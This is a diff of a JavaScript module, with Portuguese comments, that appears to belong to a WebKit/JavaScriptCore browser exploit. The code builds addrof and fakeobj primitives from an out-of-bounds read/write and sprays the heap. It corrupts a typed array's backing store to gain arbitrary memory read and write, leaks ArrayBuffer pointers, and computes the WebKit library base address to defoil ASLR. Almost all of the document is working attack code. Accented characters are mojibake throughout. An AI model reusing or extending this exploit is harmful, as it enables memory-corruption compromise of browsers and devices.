@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v123 - R83 Reutilizar Primitivas da Fase 4 na Fase 5)
+// js/script3/testArrayBufferVictimCrash.mjs (v124 - R84 Addrof em ArrayBuffer na Fase 5)
 // =======================================================================================
-// ESTRAT…GIA ATUALIZADA:
-// - Remover a re-inicializaÁ„o de 'confused_array' e 'victim_array' na Fase 5.
-// - As primitivas 'addrof_func' e 'fakeobj_func' (e, portanto, suas arrays internas)
-//   ser„o as MESMAS que foram configuradas e verificadas na Fase 4.
-// - Isso na esperanÁa de que a 'addrof_func' mantenha sua capacidade de vazar endereÁos v·lidos.
+// ESTRAT√âGIA ATUALIZADA:
+// - Na Fase 5, tentar√° usar 'addrof_func' para vazar o endere√ßo de um novo ArrayBuffer.
+// - Se o vazamento do ArrayBuffer for bem-sucedido e o endere√ßo for v√°lido,
+//   tentaremos vazar o ponteiro para o ArrayBufferContents e, em seguida, o ponteiro de dados brutos.
+// - Este √© um teste para ver se a primitiva 'addrof' √© mais est√°vel para ArrayBuffers.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,10 +17,10 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-// Nome do mÛdulo atualizado para refletir a nova tentativa de correÁ„o
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v123_R83_ReusePhase4Primitives";
+// Nome do m√≥dulo atualizado para refletir a nova tentativa de corre√ß√£o
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v124_R84_AddrofArrayBuffer";
 
-// --- FunÁıes de Convers„o (Double <-> Int64) ---
+// --- Fun√ß√µes de Convers√£o (Double <-> Int64) ---
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
@@ -38,37 +38,37 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUN«√O ORQUESTRADORA PRINCIPAL
+// FUN√á√ÉO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: ImplementaÁ„o Reutilizando Primitivas da Fase 4 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementa√ß√£o com Addrof em ArrayBuffer na Fase 5 ---`, "test");
 
     let final_result = {
         success: false,
-        message: "A verificaÁ„o funcional de L/E falhou.",
+        message: "A verifica√ß√£o funcional de L/E falhou.",
         webkit_base_addr: null
     };
 
-    // Primitivas de addrof/fakeobj (n„o ser„o re-declaradas na Fase 5, apenas limpas/reutilizadas)
+    // Primitivas de addrof/fakeobj (n√£o ser√£o re-declaradas na Fase 5, apenas limpas/reutilizadas)
     let confused_array;
     let victim_array;
     let addrof_func;
     let fakeobj_func; 
 
-    // A primitiva arbitr·ria real ser· baseada no Uint8Array corruptÌvel
+    // A primitiva arbitr√°ria real ser√° baseada no Uint8Array corrupt√≠vel
     let arb_rw_array = null; 
 
-    // As funÁıes de leitura/escrita arbitr·ria para a Fase 5 e em diante
+    // As fun√ß√µes de leitura/escrita arbitr√°ria para a Fase 5 e em diante
     let arb_read_stable = null;
     let arb_write_stable = null;
 
-    // Vari·veis com escopo ajustado para serem acessÌveis em toda a funÁ„o
+    // Vari√°veis com escopo ajustado para serem acess√≠veis em toda a fun√ß√£o
     let leak_target_obj = null;
-    let leak_target_addr = null;
+    let leak_target_addr = null; // Endere√ßo do objeto alvo geral (pode ser o ArrayBuffer agora)
 
     try {
-        // Helper para definir as primitivas. Ser· chamado APENAS UMA VEZ no inÌcio.
+        // Helper para definir as primitivas. Ser√° chamado APENAS UMA VEZ no in√≠cio.
         const setupAddrofFakeobj = () => {
             confused_array = [13.37]; 
             victim_array = [{ dummy: 0 }]; 
@@ -84,8 +84,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
 
 
-        // --- FASES 1-3: ConfiguraÁ„o das Primitivas INICIAL (para verificaÁ„o) ---
-        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificaÁ„o)... ---", "subtest");
+        // --- FASES 1-3: Configura√ß√£o das Primitivas INICIAL (para verifica√ß√£o) ---
+        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verifica√ß√£o)... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true }); 
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
@@ -105,86 +105,85 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 leaker_phase4.val_prop = int64ToDouble(value);
             }
         };
-        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida est„o prontas para verificaÁ„o.", "good");
+        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida est√£o prontas para verifica√ß√£o.", "good");
 
-        // --- FASE 4: EstabilizaÁ„o de Heap e VerificaÁ„o Funcional de L/E ---
+        // --- FASE 4: Estabiliza√ß√£o de Heap e Verifica√ß√£o Funcional de L/E ---
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
         const spray_phase4 = [];
         for (let i = 0; i < 1000; i++) {
             spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
         }
         const test_obj_phase4 = spray_phase4[500]; 
-        logS3("Spray de 1000 objetos concluÌdo para estabilizaÁ„o.", "info");
+        logS3("Spray de 1000 objetos conclu√≠do para estabiliza√ß√£o.", "info");
 
         const test_obj_addr_phase4 = addrof_func(test_obj_phase4);
         const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
         const prop_a_addr_phase4 = test_obj_addr_phase4.add(0x10); 
 
-        logS3(`(VerificaÁ„o Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereÁo ${prop_a_addr_phase4.toString(true)}...`, "info");
+        logS3(`(Verifica√ß√£o Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endere√ßo ${prop_a_addr_phase4.toString(true)}...`, "info");
         arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);
 
         const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
-        logS3(`(VerificaÁ„o Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");
+        logS3(`(Verifica√ß√£o Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");
 
         if (!value_read_phase4.equals(value_to_write_phase4)) {
-            throw new Error(`A verificaÁ„o de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
+            throw new Error(`A verifica√ß√£o de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
         }
-        logS3("VERIFICA«√O DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitr·ria È 100% funcional.", "vuln");
+        logS3("VERIFICA√á√ÉO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitraria √© 100% funcional.", "vuln");
         await PAUSE_S3(50); 
 
         // ============================================================================
-        // NOVO: CRIAR leak_target_obj AQUI, ANTES DO "RESET" (que agora È sÛ limpeza de leaker)
+        // PREPARANDO FASE 5: REUTILIZAR PRIMITIVAS (SEM RE-TRIGGER OOB)
         // ============================================================================
-        leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
-        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
-        logS3(`[PRE-FASE 5] Objeto alvo (leak_target_obj) criado. Usar· as primitivas da Fase 4.`, "info");
-        await PAUSE_S3(50); 
-
-        // --- PREPARANDO FASE 5: APENAS LIMPEZA DE REFER NCIAS (SEM RE-INICIALIZA«√O DE PRIMITIVAS) ---
-        logS3("--- PREPARANDO FASE 5: APENAS LIMPEZA DE REFER NCIAS (SEM RE-INICIALIZA«√O DE PRIMITIVAS) ---", "critical");
+        logS3("--- PREPARANDO FASE 5: REUTILIZANDO PRIMITIVAS DA FASE 4 (SEM RE-TRIGGER OOB) ---", "critical");
         
-        // Apenas zera as referÍncias dos leakers usados na Fase 4 para evitar contaminaÁ„o.
-        // As arrays confused_array e victim_array, e as funÁıes addrof_func/fakeobj_func
-        // continuam sendo as mesmas inst‚ncias j· configuradas e otimizadas da Fase 4.
+        // Apenas zera as refer√™ncias dos leakers usados na Fase 4 para evitar contamina√ß√£o.
         leaker_phase4 = null; 
-        arb_rw_array = null; // Ainda limpa o arb_rw_array para ser criado do zero.
+        arb_rw_array = null; 
 
         await PAUSE_S3(200); 
 
-        logS3("Ambiente OOB existente ser· reutilizado. Primitivas addrof/fakeobj da Fase 4 ser„o reutilizadas.", "good");
+        logS3("Ambiente OOB existente ser√° reutilizado. Primitivas addrof/fakeobj da Fase 4 ser√£o reutilizadas.", "good");
 
-        // Warm-up N√O … NECESS¡RIO aqui, pois as primitivas s„o as mesmas da Fase 4.
-        logS3("--- Warm-up: PULADO, Primitivas da Fase 4 est„o sendo reutilizadas. ---", "info");
+        // Warm-up N√ÉO √â NECESS√ÅRIO aqui, pois as primitivas s√£o as mesmas da Fase 4.
+        logS3("--- Warm-up: PULADO, Primitivas da Fase 4 est√£o sendo reutilizadas. ---", "info");
         await PAUSE_S3(50); 
 
         // ============================================================================
-        // CONSTRU«√O DA PRIMITIVA DE LEITURA/ESCRITA ARBITR¡RIA EST¡VEL (CORRUP«√O DE BACKING STORE)
-        // (Continua usando as primitivas addrof/fakeobj da Fase 4)
+        // NOVO: TESTAR ADDROF EM ARRAYBUFFER NA FASE 5
         // ============================================================================
-        logS3("--- FASE 5.1: Construindo Primitiva de L/E Est·vel (CorrupÁ„o de Backing Store) ---", "subtest");
+        logS3("--- FASE 5: TESTE ADDROF EM ARRAYBUFFER PARA VAZAMENTO DE PONTEIROS ---", "subtest");
+        
+        const test_ab_leak = new ArrayBuffer(64); // Um ArrayBuffer para tentar vazar
+        leak_target_obj = test_ab_leak; // Define o leak_target_obj para o AB
+
+        leak_target_addr = addrof_func(test_ab_leak); 
+        logS3(`[Etapa 1] Endere√ßo do ArrayBuffer alvo (test_ab_leak) obtido: ${leak_target_addr.toString(true)}`, "info");
+        
+        // Valida√ß√£o vital para o endere√ßo do ArrayBuffer
+        if (leak_target_addr.equals(AdvancedInt64.Zero) || (leak_target_addr.high() >>> 16) !== 0x7FFF) {
+             throw new Error(`FALHA CR√çTICA: Endere√ßo do ArrayBuffer alvo (${leak_target_addr.toString(true)}) √© inv√°lido ou n√£o √© um ponteiro de userland (0x7FFF...).`);
+        }
+        logS3(`Endere√ßo do ArrayBuffer alvo V√ÅLIDO: ${leak_target_addr.toString(true)}`, "good");
+
+        // Continuar com a constru√ß√£o da primitiva de L/E est√°vel se o addrof do ArrayBuffer funcionar
+        // ============================================================================
+        // CONSTRU√á√ÉO DA PRIMITIVA DE LEITURA/ESCRITA ARBITR√ÅRIA EST√ÅVEL (CORRUP√á√ÉO DE BACKING STORE)
+        // ============================================================================
+        logS3("--- FASE 5.1: Construindo Primitiva de L/E Est√°vel (Corrup√ß√£o de Backing Store) ---", "subtest");
 
         arb_rw_array = new Uint8Array(0x1000); 
-        logS3(`    arb_rw_array criado. EndereÁo interno ser· corrompido.`, "info");
-
-        // Obter o endereÁo do leak_target_obj existente (usando addrof_func da Fase 4)
-        leak_target_addr = addrof_func(leak_target_obj); 
-        logS3(`[Etapa 1] EndereÁo do objeto alvo (leak_target_obj) obtido com primitiva da Fase 4: ${leak_target_addr.toString(true)}`, "info");
-        // ValidaÁ„o vital: o endereÁo deve ser um ponteiro real de userland
-        if (leak_target_addr.equals(AdvancedInt64.Zero) || (leak_target_addr.high() >>> 16) !== 0x7FFF) {
-             throw new Error(`FALHA CRÕTICA: EndereÁo de leak_target_obj (${leak_target_addr.toString(true)}) È inv·lido ou n„o È um ponteiro de userland (0x7FFF...).`);
-        }
-        
-        await PAUSE_S3(250); 
+        logS3(`    arb_rw_array criado. Endere√ßo interno ser√° corrompido.`, "info");
 
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array);
-        logS3(`    EndereÁo do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
+        logS3(`    Endere√ßo do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
         if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
-            throw new Error(`FALHA CRÕTICA: EndereÁo do ArrayBufferView (${arb_rw_array_ab_view_addr.toString(true)}) È inv·lido ou n„o È um ponteiro de userland (0x7FFF...).`);
+            throw new Error(`FALHA CR√çTICA: Endere√ßo do ArrayBufferView (${arb_rw_array_ab_view_addr.toString(true)}) √© inv√°lido ou n√£o √© um ponteiro de userland (0x7FFF...).`);
         }
 
 
         const oob_dv = getOOBDataView();
-        if (!oob_dv) throw new Error("DataView OOB n„o est· disponÌvel.");
+        if (!oob_dv) throw new Error("DataView OOB n√£o est√° dispon√≠vel.");
 
         const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
         const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
@@ -205,7 +204,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             else if (size_bytes === 2) result = dv.getUint16(0, true);
             else if (size_bytes === 4) result = dv.getUint32(0, true);
             else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
-            else throw new Error("Tamanho de leitura inv·lido para arb_read_stable.");
+            else throw new Error("Tamanho de leitura inv√°lido para arb_read_stable.");
 
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
             oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
@@ -221,43 +220,58 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             else if (size_bytes === 2) dv.setUint16(0, value, true);
             else if (size_bytes === 4) dv.setUint32(0, value, true);
             else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
-            else throw new Error("Tamanho de escrita inv·lido para arb_write_stable.");
+            else throw new Error("Tamanho de escrita inv√°lido para arb_write_stable.");
 
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
             oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
         };
-        logS3("Primitivas de L/E est·veis (arb_read_stable, arb_write_stable) construÌdas com sucesso.", "good");
+        logS3("Primitivas de L/E est√°veis (arb_read_stable, arb_write_stable) constru√≠das com sucesso.", "good");
         await PAUSE_S3(50);
 
 
         // ============================================================================
-        // TESTE DE COER NCIA DE L/E NA FASE 5 (usando arb_write_stable)
+        // TESTE DE COER√äNCIA DE L/E NA FASE 5 (usando arb_write_stable)
         // ============================================================================
-        logS3("--- TESTE DE COER NCIA (Fase 5): Escrita Arbitr·ria EST¡VEL vs. Leitura JS Normal ---", "subtest");
-        const coherence_test_val = 0xAAAAAAAA; 
-        const prop_f_offset = 0x10; 
-        const prop_f_addr = leak_target_addr.add(prop_f_offset); 
+        logS3("--- TESTE DE COER√äNCIA (Fase 5): Escrita Arbitr√°ria EST√ÅVEL vs. Leitura JS Normal ---", "subtest");
+        // Para ArrayBuffer, a propriedade 'f' n√£o existe. Vamos escrever/ler de seus dados internos.
+        // Precisamos vazar o DATA_POINTER_OFFSET_FROM_CONTENTS_START do ArrayBuffer
+        const ab_contents_ptr = arb_read_stable(leak_target_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), 8);
+        if (ab_contents_ptr.equals(AdvancedInt64.Zero) || (ab_contents_ptr.high() >>> 16) !== 0x7FFF) {
+            throw new Error(`FALHA CR√çTICA: Ponteiro para ArrayBufferContents (${ab_contents_ptr.toString(true)}) √© inv√°lido.`);
+        }
+        logS3(`    Ponteiro para ArrayBufferContents: ${ab_contents_ptr.toString(true)}`, "leak");
 
-        logS3(`    (CoerÍncia) Escrevendo 0x${coherence_test_val.toString(16)} em ${prop_f_addr.toString(true)} via arb_write_stable (4 bytes)...`, "info");
-        arb_write_stable(prop_f_addr, coherence_test_val, 4); 
+        const ab_data_ptr = arb_read_stable(ab_contents_ptr.add(JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START), 8);
+        if (ab_data_ptr.equals(AdvancedInt64.Zero) || (ab_data_ptr.high() >>> 16) !== 0x7FFF) {
+            throw new Error(`FALHA CR√çTICA: Ponteiro para dados do ArrayBuffer (${ab_data_ptr.toString(true)}) √© inv√°lido.`);
+        }
+        logS3(`    Ponteiro para dados brutos do ArrayBuffer: ${ab_data_ptr.toString(true)}`, "leak");
+
+
+        const coherence_test_val = 0xAAAAAAAA; // Valor para escrever (32-bit)
+        const test_offset_in_ab = 0x0; // Offset no ArrayBuffer
+
+        logS3(`    (Coer√™ncia) Escrevendo 0x${coherence_test_val.toString(16)} em dados do ArrayBuffer (${ab_data_ptr.add(test_offset_in_ab).toString(true)}) via arb_write_stable (4 bytes)...`, "info");
+        arb_write_stable(ab_data_ptr.add(test_offset_in_ab), coherence_test_val, 4); 
 
         await PAUSE_S3(10); 
 
-        logS3(`    (CoerÍncia) Lendo o valor de leak_target_obj.f via JavaScript normal...`, "info");
-        const read_via_js_normal = leak_target_obj.f;
-        logS3(`    (CoerÍncia) Valor lido via JS normal: ${toHex(read_via_js_normal)}`, "leak");
+        logS3(`    (Coer√™ncia) Lendo o valor do ArrayBuffer via JavaScript normal (test_ab_leak)...`, "info");
+        const dv_ab = new DataView(test_ab_leak);
+        const read_via_js_normal = dv_ab.getUint32(test_offset_in_ab, true);
+        logS3(`    (Coer√™ncia) Valor lido via JS normal: ${toHex(read_via_js_normal)}`, "leak");
 
         if (read_via_js_normal !== coherence_test_val) {
-            throw new Error(`FALHA CRÕTICA (COER NCIA EST¡VEL): Valor escrito via arb_write_stable (${toHex(coherence_test_val)}) N√O corresponde ao lido via JS normal (${toHex(read_via_js_normal)}) em leak_target_obj.f. Isso indica que a corrupÁ„o do backing store n„o est· funcionando como esperado.`);
+            throw new Error(`FALHA CR√çTICA (COER√äNCIA EST√ÅVEL): Valor escrito via arb_write_stable (${toHex(coherence_test_val)}) N√ÉO corresponde ao lido via JS normal (${toHex(read_via_js_normal)}) no ArrayBuffer. Isso indica que a corrup√ß√£o do backing store n√£o est√° funcionando como esperado para ABs.`);
         }
-        logS3("--- TESTE DE COER NCIA (Fase 5): SUCESSO! arb_write_stable est· escrevendo no local correto do objeto. ---", "good");
+        logS3("--- TESTE DE COER√äNCIA (Fase 5): SUCESSO! arb_write_stable est√° escrevendo no local correto do ArrayBuffer. ---", "good");
         await PAUSE_S3(50);
 
 
         // ============================================================================
-        // SCANNER DE OFFSETS (agora usando arb_read_stable)
+        // SCANNER DE OFFSETS (agora usando arb_read_stable, com base no ArrayBuffer)
         // ============================================================================
-        logS3("--- SCANNER DE OFFSETS: Varrendo a memÛria ao redor do objeto alvo (com arb_read_stable)... ---", "subtest");
+        logS3("--- SCANNER DE OFFSETS: Varrendo a mem√≥ria ao redor do ArrayBuffer alvo (com arb_read_stable)... ---", "subtest");
         let found_structure_ptr = null;
         let found_structure_id = null;
         let found_vtable_ptr = null;
@@ -267,7 +281,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const SCAN_STEP = 0x8;       
 
         for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
-            const current_scan_addr = leak_target_addr.add(offset);
+            const current_scan_addr = leak_target_addr.add(offset); // Ainda leak_target_addr (do AB)
             
             let val_8_bytes = AdvancedInt64.Zero;
             try {
@@ -277,7 +291,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
                     (val_8_bytes.high() >>> 16) === 0x7FFF) { 
                     
-                    logS3(`    [Scanner] PossÌvel Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
+                    logS3(`    [Scanner] Poss√≠vel Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
                     
                     if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) {
                         found_structure_ptr = val_8_bytes;
@@ -285,14 +299,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     }
                     else if (offset === 0x0) { 
                         found_vtable_ptr = val_8_bytes;
-                        logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do prÛprio objeto) em ${toHex(offset, 6)}!`, "good");
+                        logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do pr√≥prio objeto) em ${toHex(offset, 6)}!`, "good");
                     }
                 }
 
                 if (offset % 4 === 0) { 
                     const val_4_bytes = arb_read_stable(current_scan_addr, 4); 
                     if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
-                        logS3(`    [Scanner] PossÌvel StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
+                        logS3(`    [Scanner] Poss√≠vel StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
                         if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
                              found_structure_id = val_4_bytes;
                              logS3(`        [Scanner] --> CANDIDATO FORTE: StructureID em ${toHex(offset, 6)}!`, "good");
@@ -306,54 +320,55 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
         logS3("--- FIM DO SCANNER DE OFFSETS ---", "subtest");
 
-        // Decis„o com base no scanner
+        // Decis√£o com base no scanner
         let structure_addr = null;
         let actual_structure_id = null;
 
         if (found_structure_ptr && !found_structure_ptr.equals(AdvancedInt64.Zero)) {
             structure_addr = found_structure_ptr;
-            logS3(`[DECIS√O] Usando Ponteiro de Structure encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}: ${structure_addr.toString(true)}`, "info");
+            logS3(`[DECIS√ÉO] Usando Ponteiro de Structure encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}: ${structure_addr.toString(true)}`, "info");
         } else if (typeof found_structure_id === 'number' && found_structure_id !== 0) {
             actual_structure_id = found_structure_id;
-            logS3(`[DECIS√O] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
+            logS3(`[DECIS√ÉO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
             
+            // Para resolver o ponteiro da Structure, precisamos do webkit_base_addr e STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE.
             final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
             final_result.success = true; 
             final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
             return final_result; 
 
         } else {
-            throw new Error(`FALHA CRÕTICA: Scanner de offsets n„o encontrou Structure Pointer ou StructureID v·lidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
+            throw new Error(`FALHA CR√çTICA: Scanner de offsets n√£o encontrou Structure Pointer ou StructureID v√°lidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
         }
 
 
         // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
         const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         const jsobject_put_addr = arb_read_stable(vfunc_put_ptr_addr, 8); 
-        logS3(`[Etapa 3] Lendo do endereÁo ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
-        logS3(`[Etapa 3] EndereÁo vazado da funÁ„o (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
-        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da funÁ„o JSC::JSObject::put È NULO ou inv·lido.");
+        logS3(`[Etapa 3] Lendo do endere√ßo ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
+        logS3(`[Etapa 3] Endere√ßo vazado da fun√ß√£o (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
+        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da fun√ß√£o JSC::JSObject::put √© NULO ou inv√°lido.");
         if (!((jsobject_put_addr.high() >>> 16) === 0x7FFF || (jsobject_put_addr.high() === 0 && jsobject_put_addr.low() !== 0))) {
             logS3(`[Etapa 3] ALERTA: high part do JSObject::put Address inesperado: ${toHex(jsobject_put_addr.high())}`, "warn");
         }
 
 
-        // 4. Calcular o endereÁo base da WebKit.
+        // 4. Calcular o endere√ßo base da WebKit.
         const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
         logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");
 
         const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
         final_result.webkit_base_addr = webkit_base_addr.toString(true);
 
-        logS3(`++++++++++++ SUCESSO! ENDERE«O BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
-        logS3(`   ENDERE«O BASE: ${final_result.webkit_base_addr}`, "vuln");
+        logS3(`++++++++++++ SUCESSO! ENDERE√áO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
+        logS3(`   ENDERE√áO BASE: ${final_result.webkit_base_addr}`, "vuln");
 
         final_result.success = true;
         final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;
 
     } catch (e) {
         final_result.success = false;
-        final_result.message = `ExceÁ„o na implementaÁ„o funcional: ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exce√ß√£o na implementa√ß√£o funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     } finally {
         confused_array = null;
@@ -366,10 +381,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         leak_target_obj = null; 
         leak_target_addr = null; 
         
-        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referÍncias concluÌda.`, "info");
+        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de refer√™ncias conclu√≠da.`, "info");
     }
 
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} ConcluÌdo ---`, "test");
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Conclu√≠do ---`, "test");
     return {
         errorOccurred: final_result.success ? null : final_result.message,
         addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
@@ -379,7 +394,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             webkit_base_candidate: final_result.webkit_base_addr
         },
         heisenbug_on_M2_in_best_result: final_result.success,
-        oob_value_of_best_result: 'N/A (EstratÈgia CorrupÁ„o de Backing Store)',
+        oob_value_of_best_result: 'N/A (Estrat√©gia Corrup√ß√£o de Backing Store)',
         tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Backing Store Corruption)' }
     };
 }
